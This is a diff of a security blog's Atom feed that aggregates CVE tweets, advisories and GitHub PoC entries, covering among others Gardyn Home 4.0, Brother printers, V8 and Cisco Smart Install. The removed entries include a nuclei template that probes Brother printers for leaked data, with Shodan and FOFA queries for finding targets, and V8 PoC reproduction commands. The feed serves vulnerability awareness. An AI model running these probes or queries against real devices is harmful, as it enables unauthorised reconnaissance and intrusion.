@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-04T15:32:39.675Z</updated>
+  <updated>2025-07-04T16:00:36.575Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,135 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>VulmonFeeds Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_4170688388/"/>
+    <id>http://example.com/2025/07/04/twitter_4170688388/</id>
+    <published>2025-07-04T16:00:36.000Z</published>
+    <updated>2025-07-04T16:00:36.575Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> VulmonFeeds</p><p><strong>推文：</strong> CVE-2025-52833</p><p>designthemes LMS 9.1及之前版本中的SQL注入漏洞</p><p><a href="https://t.co/OaM3TtUtmW">https://t.co/OaM3TtUtmW</a></p><p><strong>链接：</strong> <a href="https://x.com/VulmonFeeds/status/1941159737522819266">https://x.com/VulmonFeeds/status/1941159737522819266</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; VulmonFeeds&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-52833&lt;/p&gt;
+&lt;p&gt;designthemes LMS 9.1及之前版本中的SQL注入漏洞&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;htt</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="VulmonFeeds" scheme="http://example.com/tags/VulmonFeeds/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AtaolBO Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_1288129728/"/>
+    <id>http://example.com/2025/07/04/twitter_1288129728/</id>
+    <published>2025-07-04T16:00:30.000Z</published>
+    <updated>2025-07-04T16:00:30.931Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> AtaolBO</p><p><strong>推文：</strong> 查看我最新通讯文章：Wing FTP服务器漏洞（CVE-2025-47812）——立即修补以防服务器被完全接管 <a href="https://t.co/HyvwROmuaK">https://t.co/HyvwROmuaK</a> 通过@LinkedIn</p><p><strong>链接：</strong> <a href="https://x.com/AtaolBO/status/1941162251572187542">https://x.com/AtaolBO/status/1941162251572187542</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; AtaolBO&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 查看我最新通讯文章：Wing FTP服务器漏洞（CVE-2025-47812）——立即修补以防服务器被完全接管 &lt;a href=&quot;https://t.co/Hy</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="AtaolBO" scheme="http://example.com/tags/AtaolBO/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Gardyn Home 40 Multiple Vulnerabilities</title>
+    <link href="http://example.com/2025/07/04/github_4107118987/"/>
+    <id>http://example.com/2025/07/04/github_4107118987/</id>
+    <published>2025-07-04T16:00:27.000Z</published>
+    <updated>2025-07-04T16:00:27.643Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Gardyn Home 4.0 Multiple Vulnerabilities</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-29628, CVE-2025-29629, CVE-2025-29630, CVE-2025-29631</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Gardyn Home 4.0是一款智能水培花园设备，旨在为用户提供便捷的室内种植解决方案。该设备通常部署在家庭环境中，通过连接本地网络实现远程监控和管理。由于其智能化和网络化的特性，Gardyn Home 4.0在家庭用户中具有一定的普及率。此次披露的漏洞涉及多个安全问题，包括弱默认凭证、SSH密钥后门、设备完全接管和命令注入等。这些漏洞的技术根源主要在于设备的安全配置不当和输入验证不足。例如，弱默认凭证问题源于设备出厂时设置的默认密码强度不足，而命令注入漏洞则是由于系统对用户输入的处理不严格，导致攻击者可以通过构造恶意输入执行任意命令。这些漏洞的存在使得攻击者可能获得设备的系统级访问权限，进而对设备及其连接的本地网络发起进一步攻击。此外，攻击者还可能通过利用这些漏洞干扰设备的正常运行，甚至对设备及其种植的植物造成损害。值得注意的是，部分漏洞如弱默认凭证和SSH密钥后门，虽然厂商已采取了一些措施（如禁用SSH密码认证和清理SSH授权密钥中的个人信息），但问题并未完全解决。而设备完全接管和命令注入漏洞则尚未得到修补，这增加了设备被攻击的风险。</p><p><strong>产品厂商：</strong> Gardyn</p><p><strong>产品名称：</strong> Gardyn Home 4.0</p><p><strong>来源：</strong> <a href="https://github.com/mselbrede/gardyn">https://github.com/mselbrede/gardyn</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-29628_CVE-2025-29631.md</li><li>CVE-2025-29629.md</li><li>CVE-2025-29630.md</li><li>LICENSE</li><li>README.md</li><li>run_cli.png</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>In February 2025 I conducted security research on a Gardyn Home 4.0 device. During my research, I discovered multiple vulnerabilities and poor security practices. By leveraging these vulnerabilities an attacker may be able to gain system level access to a Gardyn device and use it to stage further attacks against the local area network it is connected to. An attacker may also use this access to affect the normal operation of the device, including damaging the plants being grown in the device and the device itself.</p><p>This repository contains the technical details and status for a collection of vulnerabilities in the Gardyn hydroponics garden. This information is being released with the purpose if informing consumers with unresolved issues in the security of the Gardyn product. </p><h3 id="Disclosure-Timeline"><a href="#Disclosure-Timeline" class="headerlink" title="Disclosure Timeline"></a>Disclosure Timeline</h3><p>2025-02-21 - Initial contact with vendor attempted.<br>2025-02-26 - Contact made with vendor sales team.<br>2025-04-07 - Contact made with vendor technical representative. Technical details of all vulnerabilities disclosed.<br>2025-06-14 - Follow up attempted with vendor regarding existing vulnerabilties.</p><p><em>as of 2025-07-04</em></p><table><thead><tr><th><strong>CVE</strong></th><th><strong>Issue</strong></th><th><strong>Status</strong></th></tr></thead><tbody><tr><td>CVE-2025-29629</td><td>Weak Default Credentials</td><td>The credentials are still the same, but password authentication has been disabled for SSH</td></tr><tr><td>CVE-2025-29630</td><td>SSH Key Backdoor</td><td>An SSH authorized key still exists but has been scrubbed of personally identifying information of a Gardyn Employee.</td></tr><tr><td>CVE-2025-29628</td><td>Full device takeover</td><td>Unpatched</td></tr><tr><td>CVE-2025-29631</td><td>Command Injection</td><td>Unpatched</td></tr></tbody></table>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Gardyn Home 4.0 Multiple Vulnerabilitie</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>whithat444 Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_1708161867/"/>
+    <id>http://example.com/2025/07/04/twitter_1708161867/</id>
+    <published>2025-07-04T16:00:25.000Z</published>
+    <updated>2025-07-04T16:00:25.007Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> whithat444</p><p><strong>推文：</strong> @inzo____ @zhero___ @nextjs 兄弟，分享一下CVE-2025-49826的漏洞利用或者概念验证(POC)呗</p><p><strong>链接：</strong> <a href="https://x.com/whithat444/status/1941164388423176382">https://x.com/whithat444/status/1941164388423176382</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; whithat444&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; @inzo____ @zhero___ @nextjs 兄弟，分享一下CVE-2025-49826的漏洞利用或者概念验证(POC)呗&lt;/p&gt;
+&lt;p&gt;&lt;st</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="whithat444" scheme="http://example.com/tags/whithat444/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>yousukezan Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_8291313/"/>
+    <id>http://example.com/2025/07/04/twitter_8291313/</id>
+    <published>2025-07-04T16:00:19.000Z</published>
+    <updated>2025-07-04T16:00:19.059Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> yousukezan</p><p><strong>推文：</strong> PHP中发现严重漏洞（CVE-2025-1735和CVE-2025-6491）。CVE-2025-1735因PostgreSQL扩展功能中的转义处理不足，可能导致SQL注入。另一方面，CVE-2025-6491在SOAP扩展处理超过2GB的命名空间时，会引发段错误。建议PHP 8.1.33、8.2.29、8.3.23、8.4.10以下版本立即更新。</p><p><a href="https://t.co/RHsVJh8gwb">https://t.co/RHsVJh8gwb</a></p><p><strong>链接：</strong> <a href="https://x.com/yousukezan/status/1941164714924666972">https://x.com/yousukezan/status/1941164714924666972</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; yousukezan&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; PHP中发现严重漏洞（CVE-2025-1735和CVE-2025-6491）。CVE-2025-1735因PostgreSQL扩展功能中的转义处理不足，</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="yousukezan" scheme="http://example.com/tags/yousukezan/"/>
+    
+  </entry>
   
   <entry>
     <title>hvv74情报</title>
@@ -394,134 +523,6 @@
     
     
     <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
-    <link href="http://example.com/2025/07/04/github_1884540616/"/>
-    <id>http://example.com/2025/07/04/github_1884540616/</id>
-    <published>2025-07-04T13:00:05.000Z</published>
-    <updated>2025-07-04T13:00:05.897Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-pvpp-hvr3-xjwf">https://github.com/advisories/GHSA-pvpp-hvr3-xjwf</a></p><p><strong>CVSS 评分：</strong> 9.3</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52831">https://nvd.nist.gov/vuln/detail/CVE-2025-52831</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/plugin/video-list-manager/vulnerability/wordpress-video-list-manager-1-7-sql-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/plugin/video-list-manager/vulnerability/wordpress-video-list-manager-1-7-sql-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-pvpp-hvr3-xjwf">https://github.com/advisories/GHSA-pvpp-hvr3-xjwf</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in thanhtungtnt Video List Manager allows SQL Injection. This issue affects Video List Manager: from n&#x2F;a through 1.7.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-pvpp-hvr3-xjwf&quot;&gt;https://github.com/advisories/GHSA-pvpp-hvr3-xjwf&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
-    <link href="http://example.com/2025/07/04/github_2022167325/"/>
-    <id>http://example.com/2025/07/04/github_2022167325/</id>
-    <published>2025-07-04T13:00:04.000Z</published>
-    <updated>2025-07-04T13:00:04.677Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-hwvg-62q3-2m53">https://github.com/advisories/GHSA-hwvg-62q3-2m53</a></p><p><strong>CVSS 评分：</strong> 9.3</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52833">https://nvd.nist.gov/vuln/detail/CVE-2025-52833</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/lms/vulnerability/wordpress-lms-9-1-sql-injection-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/lms/vulnerability/wordpress-lms-9-1-sql-injection-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-hwvg-62q3-2m53">https://github.com/advisories/GHSA-hwvg-62q3-2m53</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in designthemes LMS allows SQL Injection. This issue affects LMS: from n&#x2F;a through 9.1.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-hwvg-62q3-2m53&quot;&gt;https://github.com/advisories/GHSA-hwvg-62q3-2m53&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Brother MFC-L9570CDW 信息泄露漏洞</title>
-    <link href="http://example.com/2025/07/04/github_2318367792/"/>
-    <id>http://example.com/2025/07/04/github_2318367792/</id>
-    <published>2025-07-04T12:45:19.000Z</published>
-    <updated>2025-07-04T12:45:19.777Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Brother MFC-L9570CDW 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-51977</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> Brother MFC-L9570CDW是一款多功能打印机，广泛应用于企业和家庭环境中，提供打印、扫描、复印等功能。该设备支持通过HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631）进行网络访问。</p><p>该漏洞属于信息泄露类型，技术根源在于设备未对访问&#x2F;etc&#x2F;mnt_info.csv路径的请求进行适当的身份验证。攻击者可以通过发送GET请求到该路径，无需任何认证即可获取设备的敏感信息，包括设备型号、固件版本、IP地址和序列号等。这些信息以逗号分隔值（CSV）表格的形式返回。</p><p>此漏洞的安全风险在于，攻击者可以利用泄露的信息进行进一步的攻击，如针对特定型号和固件版本的漏洞利用，或者进行网络钓鱼等社会工程学攻击。由于漏洞无需认证即可利用，且可以通过自动化工具批量扫描和利用，因此对受影响设备构成了中等程度的安全威胁。</p><p><strong>产品厂商：</strong> Brother</p><p><strong>产品名称：</strong> Brother MFC-L9570CDW</p><p><strong>搜索语法：</strong> html:”MFC-L9570CDW”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/248975b0dd50823c64c0718b4d250bc85788707a/http%2Fcves%2F2024%2FCVE-2024-51977.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/248975b0dd50823c64c0718b4d250bc85788707a/http%2Fcves%2F2024%2FCVE-2024-51977.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">51977</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Brother MFC-L9570CDW <span class="hljs-operator">-</span> Information Disclosure<br>  <span class="hljs-params">author:</span> DhiyaneshDK,iamnoooob,darses<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    An unauthenticated attacker who can access either the HTTP service (TCP port <span class="hljs-number">80</span>), the HTTPS service (TCP port <span class="hljs-number">443</span>), <span class="hljs-keyword">or</span> the IPP service (TCP port <span class="hljs-number">631</span>), can leak several pieces of sensitive information from a vulnerable device. The URI path <span class="hljs-symbol">/etc/mnt_info.csv</span> can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the device’s model, firmware version, IP address, and serial number.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/sfewer-r7/BrotherVulnerabilities/blob/main/CVE-2024-51977.rb</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span> html:<span class="hljs-string">&quot;MFC-L9570CDW&quot;</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;brother-Printer&quot;</span><br>    <span class="hljs-params">zoomeye-query:</span><br>      <span class="hljs-operator">-</span> device<span class="hljs-operator">=</span><span class="hljs-string">&quot;brother-Printer&quot;</span> <span class="hljs-operator">||</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;brother-Printer&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,brother,mfc,printer,exposure<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/etc/mnt_info.csv&quot;</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;Model Name&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;IP Address&quot;</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;status_code == 200&quot;</span><br>          <span class="hljs-operator">-</span> &#x27;contains(content_type, <span class="hljs-string">&quot;text/comma-separated-values&quot;</span>)&#x27;<br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Brother MFC-L9570CDW 信息泄露漏洞&lt;/p&gt;
-&lt;p&gt;&lt;str</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>V8 JavaScript Engine 缓冲区溢出漏洞</title>
-    <link href="http://example.com/2025/07/04/github_3165619123/"/>
-    <id>http://example.com/2025/07/04/github_3165619123/</id>
-    <published>2025-07-04T12:15:18.000Z</published>
-    <updated>2025-07-04T12:15:18.677Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> V8 JavaScript Engine 缓冲区溢出漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-6554</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> V8 JavaScript Engine是由Google开发的高性能JavaScript引擎，广泛应用于Chrome浏览器和Node.js等项目中，负责执行JavaScript代码。由于其高效和跨平台的特性，V8成为了现代Web技术栈中不可或缺的组件。本次发现的漏洞CVE-2025-6554是一个缓冲区溢出漏洞，存在于V8的特定版本13.8.500258中。漏洞的根源在于V8引擎在处理某些特定的JavaScript代码时，未能正确验证输入数据的边界，导致攻击者可以通过精心构造的JavaScript代码触发缓冲区溢出。这种漏洞可以被利用来执行任意代码，从而完全控制受影响的系统。由于V8引擎的高普及率，该漏洞的影响范围非常广泛，尤其是在使用受影响版本V8的Chrome浏览器和Node.js应用中。攻击者可以通过诱骗用户访问恶意网页或执行恶意Node.js代码来利用此漏洞，无需用户交互即可实现远程代码执行。因此，该漏洞被评级为高危，建议所有使用V8引擎的用户尽快检查并更新到安全版本。</p><p><strong>产品厂商：</strong> Google</p><p><strong>产品名称：</strong> V8 JavaScript Engine</p><p><strong>影响版本：</strong> 13.8.500258</p><p><strong>来源：</strong> <a href="https://github.com/windz3r0day/CVE-2025-6554">https://github.com/windz3r0day/CVE-2025-6554</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>poc-CVE-2025-6554.js</li><li>v8asan.sh</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-6554"><a href="#CVE-2025-6554" class="headerlink" title="CVE-2025-6554"></a>CVE-2025-6554</h2><h3 id="Reproducing-the-Vulnerability"><a href="#Reproducing-the-Vulnerability" class="headerlink" title="Reproducing the Vulnerability"></a>Reproducing the Vulnerability</h3><p>git clone <a href="https://chromium.googlesource.com/chromium/tools/depot_tools.git">https://chromium.googlesource.com/chromium/tools/depot_tools.git</a><br>export PATH&#x3D;&#x2F;path&#x2F;to&#x2F;depot_tools:$PATH</p><p>fetch v8<br>cd v8<br>git checkout 13.8.500258<br>gclient sync -D<br>sh v8asan.sh<br>autoninja -C out&#x2F;arm64.asan d8<br>ASAN_OPTIONS&#x3D;detect_leaks&#x3D;1:halt_on_error&#x3D;0 .&#x2F;d8 –allow-natives-syntax –trace-opt –trace-deopt poc-CVE-2025-6554.js</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; V8 JavaScript Engine 缓冲区溢出漏洞&lt;/p&gt;
-&lt;p&gt;&lt;st</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Cisco IOS Smart Install - Buffer Overflow</title>
-    <link href="http://example.com/2025/07/04/github_422631421/"/>
-    <id>http://example.com/2025/07/04/github_422631421/</id>
-    <published>2025-07-04T12:00:21.000Z</published>
-    <updated>2025-07-04T12:00:21.120Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cisco IOS Smart Install - Buffer Overflow</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-0171</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Cisco IOS和IOS XE软件中的Smart Install协议存在缓冲区溢出漏洞。此漏洞允许未经身份验证的远程攻击者通过向受影响设备的TCP端口4786发送特制的Smart Install消息来利用此漏洞。成功利用此漏洞的攻击者可能导致受影响设备上的缓冲区溢出，进而可能产生以下影响：任意代码执行、拒绝服务（设备重新启动）或使设备陷入消耗CPU资源的无限循环中。受影响的设备包括多个启用了Smart Install功能的Cisco IOS版本。此漏洞的利用可能导致设备重新启动、代码执行或无限循环，严重威胁网络设备的安全性和稳定性。由于此漏洞的严重性，建议用户及时应用Cisco提供的软件更新，或在不必要的情况下禁用Smart Install功能，或限制对TCP端口4786的访问。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco IOS</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:cisco:ios”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/6d8fad9af6651c8217c89e1679e0ec37d3608868/network%2Fcves%2F2018%2FCVE-2018-0171.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/6d8fad9af6651c8217c89e1679e0ec37d3608868/network%2Fcves%2F2018%2FCVE-2018-0171.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 